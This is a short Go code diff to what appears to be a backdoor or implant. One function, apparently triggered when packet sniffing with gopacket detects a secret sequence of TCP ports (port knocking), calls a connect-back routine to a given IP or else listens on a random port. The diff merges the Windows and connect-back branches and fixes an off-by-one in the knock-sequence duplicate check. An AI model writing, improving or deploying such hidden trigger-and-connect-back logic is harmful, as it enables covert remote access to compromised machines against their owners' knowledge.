@@ -71,11 +71,7 @@ func main() {
 }
 
 func vishnu(ip string, tInfo *targetInfo) {
-	if tInfo.os == "windows" {
-		spec.ConnectBack(ip, connectbackPort)
-	}
-
-	if connectback && tInfo.os != "windows" {
+	if connectback || tInfo.os == "windows" {
 		spec.ConnectBack(ip, connectbackPort)
 	} else {
 		randomPort := rand.Intn(65535-100) + 100
@@ -118,7 +114,7 @@ func printPacketInfo(packet gopacket.Packet, tInfo *targetInfo) {
 			if tcp.DstPort == layers.TCPPort(tInfo.secretPorts[tInfo.secretCounter]) { 
 				tInfo.secretCounter++
 				tInfo.lastPort = tcp.DstPort
-			} else if tInfo.lastPort == layers.TCPPort(tInfo.secretPorts[tInfo.secretCounter]) { // fixed TCP 2x duplication issue
+			} else if tInfo.secretCounter != 0 && tInfo.lastPort == layers.TCPPort(tInfo.secretPorts[tInfo.secretCounter-1]) { // fixed TCP 2x duplication issue
 				fmt.Println("duplicate tcp") // pass
 			} else {
 				// reset counter
